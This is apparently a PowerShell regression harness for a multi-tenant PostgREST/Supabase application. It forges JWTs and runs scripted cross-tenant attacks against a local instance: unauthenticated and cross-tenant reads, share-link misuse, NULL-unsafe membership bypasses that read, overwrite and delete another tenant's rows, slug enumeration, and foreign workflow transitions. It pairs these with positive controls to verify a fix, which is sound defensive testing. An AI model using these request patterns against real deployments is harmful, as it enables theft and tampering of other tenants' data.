# Executed attacks, over real HTTP against real PostgREST, with real HS256 JWTs.
#
# F2  parts_with_pricing, read with no JWT and read across tenants
# F3  share links: cross-tenant minting, and what require_auth actually means
# F4  the NULL-unsafe membership gates, from an account with no organization
# F5  organization slug enumeration by response shape
# F6  a workflow transition belonging to another tenant, applied to your file
#
# Every attack must SUCCEED before the fix and FAIL after it. The script prints
# a verdict per attack and exits non-zero if the overall picture does not match
# the -Expect argument, so "it passed" cannot be a matter of reading output.
#
#   .\attack.ps1 -Expect vulnerable   # against the current release
#   .\attack.ps1 -Expect fixed        # after the fix
param(
  [ValidateSet('vulnerable','fixed')]
  [string]$Expect = 'vulnerable',
  [string]$RestUrl = 'http://localhost:53000',
  [string]$JwtSecret = 'blueplm-harness-super-secret-jwt-token-with-at-least-32-characters'
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------- identities --
$ACME_ORG     = 'aaaaaaaa-0000-4000-8000-000000000001'
$UMBRELLA_ORG = 'bbbbbbbb-0000-4000-8000-000000000001'
$ALICE        = 'aaaaaaaa-1111-4000-8000-000000000001'
$BOB          = 'bbbbbbbb-1111-4000-8000-000000000001'
$MALLORY      = 'cccccccc-1111-4000-8000-000000000001'
$ACME_VAULT   = 'aaaaaaaa-2222-4000-8000-000000000001'
$ACME_FILE    = 'aaaaaaaa-3333-4000-8000-000000000001'
# Separate file for the transition attack, so a successful attack cannot break
# the positive control that runs Alice's own transition on ACME_FILE.
$ACME_FILE2   = 'aaaaaaaa-3333-4000-8000-000000000002'

function ConvertTo-B64Url([byte[]]$Bytes) {
  [Convert]::ToBase64String($Bytes).TrimEnd('=').Replace('+','-').Replace('/','_')
}

function New-Jwt {
  param([string]$Sub, [string]$Role = 'authenticated', [string]$Email = '')
  $header  = '{"alg":"HS256","typ":"JWT"}'
  $exp     = [DateTimeOffset]::UtcNow.AddHours(2).ToUnixTimeSeconds()
  $claims  = @{ role = $Role; exp = $exp }

  # NO sub CLAIM AT ALL WHEN THERE IS NO SUBJECT
  #
  # This used to emit `"sub": ""` for the anon token. auth.uid() casts the claim
  # to uuid, `''::uuid` raises invalid_text_representation, and PostgREST turns
  # that into HTTP 400 - which this script scored as a refusal. Every anon
  # attack that got as far as auth.uid() was therefore passing for the wrong
  # reason, inside the harness built to stop exactly that.
  #
  # A real Supabase publishable key carries no sub, so the claim is absent, the
  # GUC is absent, and auth.uid() is NULL. That is the case the gates are
  # written against and the one worth testing.
  if ($Sub)   { $claims.sub = $Sub; $claims.aud = 'authenticated' }
  if ($Email) { $claims.email = $Email }

  $payload = $claims | ConvertTo-Json -Compress
  $h = ConvertTo-B64Url ([Text.Encoding]::UTF8.GetBytes($header))
  $p = ConvertTo-B64Url ([Text.Encoding]::UTF8.GetBytes($payload))
  $signing = "$h.$p"
  $hmac = New-Object System.Security.Cryptography.HMACSHA256
  $hmac.Key = [Text.Encoding]::UTF8.GetBytes($JwtSecret)
  $sig = ConvertTo-B64Url ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($signing)))
  "$signing.$sig"
}

# anon uses a JWT whose role claim is anon and which carries no subject -
# exactly the shape of a publishable key.
$TOK_ANON    = New-Jwt -Sub '' -Role 'anon'
$TOK_BOB     = New-Jwt -Sub $BOB     -Role 'authenticated' -Email 'bob@umbrella.test'
$TOK_MALLORY = New-Jwt -Sub $MALLORY -Role 'authenticated' -Email 'mallory@nowhere.test'
$TOK_ALICE   = New-Jwt -Sub $ALICE   -Role 'authenticated' -Email 'alice@acme.test'

# The workflow objects seeded for the cross-tenant transition attack.
$UMB_TRANSITION  = 'bbbbbbbb-8888-4000-8000-000000000001'
$ACME_TRANSITION      = 'aaaaaaaa-8888-4000-8000-000000000001'
$ACME_TRANSITION_BACK = 'aaaaaaaa-8888-4000-8000-000000000002'

# Requests that never reached the server, recorded here rather than at each call
# site so that no call site can forget. A connection failure must never be
# scored as the server refusing.
$script:Transport = @()

function Invoke-Rest {
  param([string]$Path, [string]$Token, [string]$Method = 'GET', $Body = $null)
  $headers = @{ Authorization = "Bearer $Token"; 'Accept' = 'application/json' }
  $uri = "$RestUrl$Path"
  try {
    if ($Body -ne $null) {
      $json = ($Body | ConvertTo-Json -Compress -Depth 6)
      $r = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method $Method -Headers $headers `
             -ContentType 'application/json' -Body $json -TimeoutSec 20
    } else {
      $r = Invoke-WebRequest -UseBasicParsing -Uri $uri -Method $Method -Headers $headers -TimeoutSec 20
    }
    [pscustomobject]@{ Status = [int]$r.StatusCode; Body = $r.Content }
  } catch {
    $resp = $_.Exception.Response
    if ($resp) {
      $sr = New-Object IO.StreamReader($resp.GetResponseStream())
      [pscustomobject]@{ Status = [int]$resp.StatusCode; Body = $sr.ReadToEnd() }
    } else {
      $script:Transport += "$Method $Path"
      [pscustomobject]@{ Status = -1; Body = $_.Exception.Message }
    }
  }
}

function Trunc {
  param([string]$Text, [int]$Max = 220)
  if ($null -eq $Text) { return '' }
  $flat = ($Text -replace '\s+', ' ')
  if ($flat.Length -le $Max) { return $flat }
  $flat.Substring(0, $Max) + '...'
}

$script:Results = @()

function Report {
  param([string]$Id, [string]$What, [bool]$Breached, [string]$Evidence)
  $script:Results += [pscustomobject]@{ Id = $Id; What = $What; Breached = $Breached; Evidence = $Evidence }
  $verdict = if ($Breached) { 'BREACHED' } else { 'refused ' }
  $colour  = if ($Breached) { 'Red' } else { 'Green' }
  Write-Host ("[{0}] {1}  {2}" -f $verdict, $Id.PadRight(6), $What) -ForegroundColor $colour
  if ($Evidence) { Write-Host ("         {0}" -f $Evidence) -ForegroundColor DarkGray }
}

# --------------------------------------------------------------- preflight ---
# Refuse to draw any conclusion from a harness that is not actually answering.
Write-Host "`n=== PREFLIGHT ===" -ForegroundColor Yellow
$ping = Invoke-Rest -Path '/' -Token $TOK_ANON
if ($ping.Status -ne 200) {
  Write-Host "ABORT: PostgREST at $RestUrl did not answer (status $($ping.Status)). Nothing below would mean anything." -ForegroundColor Red
  Write-Host "       Bring it up with: docker compose up -d rest" -ForegroundColor Red
  exit 2
}
# And that it is pointed at a database with the seed in it.
$seedCheck = Invoke-Rest -Path '/rpc/get_org_auth_providers' -Token $TOK_ANON -Method POST -Body @{ p_org_slug = 'acme' }
if ($seedCheck.Status -ne 200) {
  Write-Host "ABORT: the seed is missing (get_org_auth_providers returned $($seedCheck.Status)). Run sql/seed.sql first." -ForegroundColor Red
  exit 2
}
Write-Host "PostgREST is answering and the seed is present." -ForegroundColor Green

Write-Host "`n=== ATTACKS (expecting: $Expect) ===`n" -ForegroundColor Yellow

# --------------------------------------------------------------- finding 2 ---
# parts_with_pricing read with no authentication at all.
$r = Invoke-Rest -Path '/parts_with_pricing?select=part_number,description,preferred_supplier,file_path' -Token $TOK_ANON
$leaked = ($r.Status -eq 200 -and $r.Body -match 'ACME-SECRET-0001')
Report -Id 'F2a' -What 'anon reads parts_with_pricing (another tenant''s parts and prices)' `
       -Breached $leaked -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# Same view as a *member of the other org*: even authenticated, the view has no
# RLS of its own and is not security_invoker, so Umbrella sees Acme.
$r = Invoke-Rest -Path '/parts_with_pricing?select=part_number,description' -Token $TOK_BOB
$leaked2 = ($r.Status -eq 200 -and $r.Body -match 'ACME-SECRET-0001')
Report -Id 'F2b' -What 'Umbrella member reads Acme parts through parts_with_pricing' `
       -Breached $leaked2 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# --------------------------------------------------------------- finding 3 ---
# Bob is a real member of Umbrella. He passes his own org id (so
# require_org_member is satisfied) and Acme's file id (which nothing checks).
$r = Invoke-Rest -Path '/rpc/create_file_share_link' -Token $TOK_BOB -Method POST -Body @{
  p_org_id = $UMBRELLA_ORG; p_file_id = $ACME_FILE; p_created_by = $BOB
  p_expires_in_days = 7; p_max_downloads = 10; p_require_auth = $true
}
$minted = ($r.Status -eq 200 -and $r.Body -match '"token"')
$token = $null
if ($minted) { $token = ($r.Body | ConvertFrom-Json)[0].token }
Report -Id 'F3a' -What 'Umbrella member mints a share link for an Acme file' `
       -Breached $minted -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# F3b, F3c, F3d and F3e are about the require_auth flag, and they used to hang
# off the token minted by F3a - so the moment F3a was fixed and minted nothing,
# all of them reported 'refused' with the evidence "no token was minted". Three
# of the four findings this release is about shipped with no executed coverage
# at all, and the suite said 0 of 13 breached.
#
# They now mint their own links, legitimately, as Alice on Alice's own file.
# That works in every state of the code, so a refusal below is always a
# statement about require_auth and never about the mint.
function New-AliceLink {
  param([bool]$RequireAuth, [int]$MaxDownloads = 10)
  $r = Invoke-Rest -Path '/rpc/create_file_share_link' -Token $TOK_ALICE -Method POST -Body @{
    p_org_id = $ACME_ORG; p_file_id = $ACME_FILE; p_created_by = $ALICE
    p_expires_in_days = 7; p_max_downloads = $MaxDownloads; p_require_auth = $RequireAuth
  }
  if ($r.Status -eq 200 -and $r.Body -match '"token"') { ($r.Body | ConvertFrom-Json)[0].token } else { $null }
}

$protectedToken = New-AliceLink -RequireAuth $true
$openToken      = New-AliceLink -RequireAuth $false -MaxDownloads 10

if (-not $protectedToken -or -not $openToken) {
  Write-Host "ABORT: Alice could not mint her own share links, so the require_auth attacks below would be measuring the wrong thing." -ForegroundColor Red
  exit 2
}

# require_auth = true, called with no credentials at all.
$r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $protectedToken }
Report -Id 'F3b' -What 'anon redeems a require_auth=true link' `
       -Breached ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true') `
       -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# The allowance is spent by validating, not by downloading.
$spent = 0
for ($i = 0; $i -lt 12; $i++) {
  $rr = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $openToken }
  if ($rr.Body -match 'Download limit reached') { $spent = $i + 1; break }
}
Report -Id 'F3c' -What 'anon exhausts a 10-download allowance without downloading anything' `
       -Breached ($spent -gt 0) -Evidence ("limit hit after {0} validate calls" -f $spent)

# require_auth = true, called by a signed-in member of a DIFFERENT tenant.
#
# This is what "any Supabase account" bought an attacker: signing up is free, so
# a flag that only asks whether you are signed in restricts nothing. Bob gets
# the file id and the owning organization id of an Acme file he has no
# relationship to.
$r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_BOB -Method POST -Body @{ p_token = $protectedToken }
Report -Id 'F3d' -What 'Umbrella member redeems Acme''s require_auth=true link' `
       -Breached ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true') `
       -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# And by an account that belongs to no organization at all, which is what any
# attacker has thirty seconds after deciding to become one.
$r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_MALLORY -Method POST -Body @{ p_token = $protectedToken }
Report -Id 'F3e' -What 'org-less account redeems Acme''s require_auth=true link' `
       -Breached ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true') `
       -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# --------------------------------------------------------------- finding 4 ---
# Mallory has users.org_id IS NULL. `p_org_id NOT IN (SELECT org_id ...)`
# evaluates to NULL, the IF is not taken, and the body runs against Acme.
$r = Invoke-Rest -Path "/rpc/get_org_odoo_configs" -Token $TOK_MALLORY -Method POST -Body @{ p_org_id = $ACME_ORG }
$f4a = ($r.Status -eq 200 -and $r.Body -match 'acme-secret')
Report -Id 'F4a' -What 'org-less account reads Acme''s Odoo configuration' `
       -Breached $f4a -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

$r = Invoke-Rest -Path "/rpc/get_org_integration_status" -Token $TOK_MALLORY -Method POST -Body @{
  p_org_id = $ACME_ORG; p_integration_type = 'odoo' }
$f4a2 = ($r.Status -eq 200 -and $r.Body -match '"integration_type"\s*:\s*"odoo"')
Report -Id 'F4a2' -What 'org-less account reads Acme''s integration status' `
       -Breached $f4a2 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

$r = Invoke-Rest -Path "/rpc/get_item_designation_assignments" -Token $TOK_MALLORY -Method POST -Body @{
  p_org_id = $ACME_ORG; p_vault_id = $ACME_VAULT }
$f4b = ($r.Status -eq 200 -and $r.Body -match 'ACME-SECRET-0001')
Report -Id 'F4b' -What 'org-less account reads Acme''s item-designation assignments' `
       -Breached $f4b -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

$r = Invoke-Rest -Path "/rpc/upsert_item_image" -Token $TOK_MALLORY -Method POST -Body @{
  p_org_id = $ACME_ORG; p_part_number = 'ACME-SECRET-0001'
  p_image_type = 'icon'; p_icon_name = 'skull'; p_icon_color = '#000000' }
$f4c = ($r.Status -eq 200 -and $r.Body -match 'skull')
Report -Id 'F4c' -What 'org-less account OVERWRITES a row in Acme''s item_images' `
       -Breached $f4c -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

$r = Invoke-Rest -Path "/rpc/reset_item_image" -Token $TOK_MALLORY -Method POST -Body @{
  p_org_id = $ACME_ORG; p_part_number = 'ACME-SECRET-0001' }
$f4d = ($r.Status -eq 200 -and $r.Body -match 'true')
Report -Id 'F4d' -What 'org-less account DELETES a row from Acme''s item_images' `
       -Breached $f4d -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

$r = Invoke-Rest -Path "/rpc/get_item_designations" -Token $TOK_MALLORY -Method POST -Body @{ p_org_id = $ACME_ORG }
$f4e = ($r.Status -eq 200 -and $r.Body -match 'ITAR')
Report -Id 'F4e' -What 'org-less account reads Acme''s item designations' `
       -Breached $f4e -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# The four "saved by a conjoined admin check" cases. These should refuse both
# before and after; they are here so the fix can be shown not to regress them.
$r = Invoke-Rest -Path "/rpc/upsert_item_designation" -Token $TOK_MALLORY -Method POST -Body @{
  p_org_id = $ACME_ORG; p_name = 'PWNED' }
$f4f = ($r.Status -eq 200)
Report -Id 'F4f' -What 'org-less account writes an Acme item designation (admin check should stop this)' `
       -Breached $f4f -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# --------------------------------------------------------- follow-up: shape --
# Org slug enumeration by response shape.
#
# 'ghost' exists and its auth_providers is exactly the object the function
# returns for an organization that does NOT exist, so the two answers carry the
# same information and any difference between them is pure side channel. Before
# the fix a hit was rendered from jsonb and a miss from json_build_object, which
# differ in key order and in the spaces around the colon; that told an
# unauthenticated caller which slugs are real.
#
# Comparing a *configured* org against a miss would not be a fair test - those
# have to differ, because the sign-in screen exists to show different buttons.
$rGhost = Invoke-Rest -Path '/rpc/get_org_auth_providers' -Token $TOK_ANON -Method POST -Body @{ p_org_slug = 'ghost' }
$rFake  = Invoke-Rest -Path '/rpc/get_org_auth_providers' -Token $TOK_ANON -Method POST -Body @{ p_org_slug = 'no-such-org-xyz' }
$enumerable = ($rGhost.Body -ne $rFake.Body)
Report -Id 'F5a' -What 'org slug enumeration: an existing org is distinguishable from a miss carrying the same answer' `
       -Breached $enumerable -Evidence ("hit ={0}`n         miss={1}" -f (Trunc $rGhost.Body 150), (Trunc $rFake.Body 150))

# --------------------------------------------------------------- finding 6 ---
# A gate on one argument, an action on another - the shape this release's
# predecessor said it had closed, in a function that release listed.
#
# Alice is a genuine Acme member acting on her own file, so
# require_file_access(p_file_id) is satisfied and always was. The second
# argument is Umbrella's transition, and nothing asked which organization it
# belonged to.
$r = Invoke-Rest -Path '/rpc/apply_workflow_transition' -Token $TOK_ALICE -Method POST -Body @{
  p_file_id = $ACME_FILE2; p_transition_id = $UMB_TRANSITION; p_user_id = $ALICE
  p_comment = 'crossing tenants'; p_approvals = @{}
}
$f6a = ($r.Status -eq 200 -and $r.Body -match '"success"\s*:\s*true')
Report -Id 'F6a' -What 'Acme member applies UMBRELLA''s transition to her own file' `
       -Breached $f6a -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# The write is only half of it. apply_workflow_transition copies the workflow,
# state and transition NAMES into workflow_history, and that row belongs to
# Alice's organization - so Umbrella's private naming becomes readable by Acme
# through Acme's own RLS-approved history. This reads it back over HTTP as
# Alice, which is the disclosure rather than the write.
$r = Invoke-Rest -Path "/workflow_history?select=workflow_name,to_state_name,transition_name&file_id=eq.$ACME_FILE2" -Token $TOK_ALICE
$f6b = ($r.Status -eq 200 -and $r.Body -match 'UMBRELLA-')
Report -Id 'F6b' -What 'Acme member reads Umbrella''s workflow/state/transition names out of her own history' `
       -Breached $f6b -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body))

# -------------------------------------------------- positive controls --------
# Legitimate use, which must work in BOTH states. Without these, "every attack
# was refused" is also what you get from a database with the schema dropped, a
# stopped API, or a fix that simply revoked everything from everyone. These are
# what distinguish a closed door from a demolished building.
Write-Host "`n=== POSITIVE CONTROLS (must pass before and after) ===`n" -ForegroundColor Yellow

$script:Controls = @()
function Control {
  param(
    [string]$Id, [string]$What, [bool]$Ok, [string]$Evidence,
    # Some controls describe behaviour the fix introduces - a tenant-scoped view,
    # an allowance that validation no longer drains. Those cannot hold before the
    # fix, so they are reported but not enforced in the vulnerable run.
    [switch]$FixedOnly
  )
  $enforced = -not ($FixedOnly -and $Expect -eq 'vulnerable')
  $script:Controls += [pscustomobject]@{ Id = $Id; What = $What; Ok = $Ok; Enforced = $enforced }
  $verdict = if ($Ok) { 'works   ' } elseif (-not $enforced) { 'n/a yet ' } else { 'BROKEN  ' }
  $colour  = if ($Ok) { 'Green' } elseif (-not $enforced) { 'DarkGray' } else { 'Red' }
  Write-Host ("[{0}] {1}  {2}" -f $verdict, $Id.PadRight(6), $What) -ForegroundColor $colour
  if ($Evidence) { Write-Host ("         {0}" -f $Evidence) -ForegroundColor DarkGray }
}

# Alice must still see her OWN organisation's parts through the view. This is
# the control on security_invoker: it proves the view was made tenant-scoped
# rather than simply broken.
$r = Invoke-Rest -Path '/parts_with_pricing?select=part_number,preferred_supplier' -Token $TOK_ALICE
Control -Id 'C1' -What 'Acme member still reads Acme parts through parts_with_pricing' `
        -Ok ($r.Status -eq 200 -and $r.Body -match 'ACME-SECRET-0001') `
        -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 200))
Control -Id 'C1b' -What '...and sees no other tenant in it' -FixedOnly `
        -Ok ($r.Status -eq 200 -and $r.Body -notmatch 'UMB-0001') `
        -Evidence ("UMB-0001 present: {0}" -f [bool]($r.Body -match 'UMB-0001'))

# Alice must still be able to share her own file.
$r = Invoke-Rest -Path '/rpc/create_file_share_link' -Token $TOK_ALICE -Method POST -Body @{
  p_org_id = $ACME_ORG; p_file_id = $ACME_FILE; p_created_by = $ALICE
  p_expires_in_days = 7; p_max_downloads = 3; p_require_auth = $false
}
$c2 = ($r.Status -eq 200 -and $r.Body -match '"token"')
$goodToken = $null
if ($c2) { $goodToken = ($r.Body | ConvertFrom-Json)[0].token }
Control -Id 'C2' -What 'Acme member still mints a share link for their OWN file' `
        -Ok $c2 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 200))

# And an anon recipient must still be able to redeem it, repeatedly, without
# the allowance draining - that is the point of splitting off consume.
$c3 = $false; $c4 = $false
if ($goodToken) {
  $r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $goodToken }
  $c3 = ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true')
  Control -Id 'C3' -What 'anon recipient still validates a legitimate share link' `
          -Ok $c3 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 200))

  for ($i = 0; $i -lt 6; $i++) {
    $rr = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $goodToken }
  }
  $c4 = ($rr.Status -eq 200 -and $rr.Body -match '"is_valid"\s*:\s*true')
  Control -Id 'C4' -What '6 more validations do NOT exhaust a 3-download allowance' -FixedOnly `
          -Ok $c4 -Evidence ("HTTP {0}: {1}" -f $rr.Status, (Trunc $rr.Body 200))
} else {
  Control -Id 'C3' -What 'anon recipient still validates a legitimate share link' -Ok $false -Evidence 'no token'
  Control -Id 'C4' -What '6 more validations do NOT exhaust a 3-download allowance' -FixedOnly -Ok $false -Evidence 'no token'
}

# The login screen.
$r = Invoke-Rest -Path '/rpc/get_org_auth_providers' -Token $TOK_ANON -Method POST -Body @{ p_org_slug = 'acme' }
$c5 = ($r.Status -eq 200)
Control -Id 'C5' -What 'sign-in screen still reads auth providers with the anon key' `
        -Ok $c5 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 160))

# Alice must still reach her own org's integration + designation data.
$r = Invoke-Rest -Path '/rpc/get_org_odoo_configs' -Token $TOK_ALICE -Method POST -Body @{ p_org_id = $ACME_ORG }
$c6 = ($r.Status -eq 200 -and $r.Body -match 'acme-secret')
Control -Id 'C6' -What 'Acme member still reads their OWN Odoo configuration' `
        -Ok $c6 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 160))

$r = Invoke-Rest -Path '/rpc/upsert_item_image' -Token $TOK_ALICE -Method POST -Body @{
  p_org_id = $ACME_ORG; p_part_number = 'ACME-SECRET-0001'
  p_image_type = 'icon'; p_icon_name = 'rocket'; p_icon_color = '#00ff00' }
$c7 = ($r.Status -eq 200 -and $r.Body -match 'rocket')
Control -Id 'C7' -What 'Acme member still writes their OWN item_images row' `
        -Ok $c7 -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 160))

# The workflow control for finding 6. Binding the transition to the file's
# organization has to leave the legitimate move working, or "the attack was
# refused" is indistinguishable from "the function refuses everything".
# execute_workflow_transition is the granted entry point - the one the renderer
# actually calls - and apply_workflow_transition is its internal tail.
# Whichever of the two directions the file is currently in. The pair exists so
# that running this script twice against one database still exercises a real
# transition instead of reporting WRONG_STATE as a broken control.
$r = Invoke-Rest -Path '/rpc/execute_workflow_transition' -Token $TOK_ALICE -Method POST -Body @{
  p_file_id = $ACME_FILE; p_transition_id = $ACME_TRANSITION; p_comment = 'legitimate move'
}
if ($r.Body -match 'WRONG_STATE') {
  $r = Invoke-Rest -Path '/rpc/execute_workflow_transition' -Token $TOK_ALICE -Method POST -Body @{
    p_file_id = $ACME_FILE; p_transition_id = $ACME_TRANSITION_BACK; p_comment = 'legitimate move back'
  }
}
Control -Id 'C8' -What 'Acme member still runs Acme''s OWN workflow transition on her own file' `
        -Ok ($r.Status -eq 200 -and $r.Body -match '"success"\s*:\s*true') `
        -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 200))

# require_auth means "a member of the file's organization", so the member it is
# meant for has to get through. Without this, F3b/F3d/F3e are satisfied by a
# flag that refuses everybody.
$r = Invoke-Rest -Path '/rpc/validate_share_link' -Token $TOK_ALICE -Method POST -Body @{ p_token = $protectedToken }
Control -Id 'C9' -What 'Acme member still redeems Acme''s require_auth=true link' `
        -Ok ($r.Status -eq 200 -and $r.Body -match '"is_valid"\s*:\s*true') `
        -Evidence ("HTTP {0}: {1}" -f $r.Status, (Trunc $r.Body 200))

# max_downloads is enforced by consume_share_link or by nothing at all: it is
# the only thing that increments the counter now that validation does not.
# Three downloads on a three-download link, then a refusal.
$limited = New-AliceLink -RequireAuth $false -MaxDownloads 3
$spendOk = $false
$accepted = 0
if ($limited) {
  for ($i = 0; $i -lt 4; $i++) {
    $rr = Invoke-Rest -Path '/rpc/consume_share_link' -Token $TOK_ANON -Method POST -Body @{ p_token = $limited }
    if ($rr.Status -eq 200 -and $rr.Body -match 'true') { $accepted++ }
  }
  $spendOk = ($accepted -eq 3)
}
Control -Id 'C10' -What 'consume_share_link spends exactly max_downloads and then refuses' -FixedOnly `
        -Ok $spendOk -Evidence ("accepted {0} of 4 attempts on a 3-download link" -f $accepted)

# ------------------------------------------------------------------ verdict --
Write-Host ""
$breached  = @($script:Results | Where-Object { $_.Breached })
$brokenCtl = @($script:Controls | Where-Object { -not $_.Ok -and $_.Enforced })

$enforcedCtl = @($script:Controls | Where-Object { $_.Enforced })
Write-Host ("{0} of {1} attacks succeeded; {2} of {3} enforced positive controls broken." -f `
  $breached.Count, $script:Results.Count, $brokenCtl.Count, $enforcedCtl.Count) -ForegroundColor Yellow

$fatal = $false

if ($script:Transport.Count -gt 0) {
  Write-Host ("FAIL: {0} request(s) never reached the server: {1}. A connection failure is not a refusal; this run proves nothing." `
    -f $script:Transport.Count, ($script:Transport -join ', ')) -ForegroundColor Red
  $fatal = $true
}

if ($brokenCtl.Count -gt 0) {
  Write-Host ("FAIL: positive control(s) broken: {0}. The application is damaged, so 'attacks refused' is meaningless." `
    -f (($brokenCtl | ForEach-Object { $_.Id }) -join ', ')) -ForegroundColor Red
  $fatal = $true
}

if ($fatal) { exit 2 }

# F4f is expected to refuse in both states (it is saved by an admin check).
$mustBreachIds = @('F2a','F2b','F3a','F3b','F3c','F3d','F3e',
                   'F4a','F4a2','F4b','F4c','F4d','F4e','F5a','F6a','F6b')
$actualBreached = @($breached | ForEach-Object { $_.Id })

if ($Expect -eq 'vulnerable') {
  $missing = @($mustBreachIds | Where-Object { $_ -notin $actualBreached })
  if ($missing.Count -gt 0) {
    Write-Host ("FAIL: expected these to succeed against the current code but they did not: {0}" -f ($missing -join ', ')) -ForegroundColor Red
    Write-Host "An attack that does not reproduce cannot be used to show a fix works." -ForegroundColor Red
    exit 1
  }
  Write-Host "OK: every attack reproduced against the current code, with all positive controls working." -ForegroundColor Green
  exit 0
} else {
  if ($actualBreached.Count -gt 0) {
    Write-Host ("FAIL: still breached after the fix: {0}" -f ($actualBreached -join ', ')) -ForegroundColor Red
    exit 1
  }
  Write-Host "OK: every attack was refused, and every positive control still works." -ForegroundColor Green
  exit 0
}
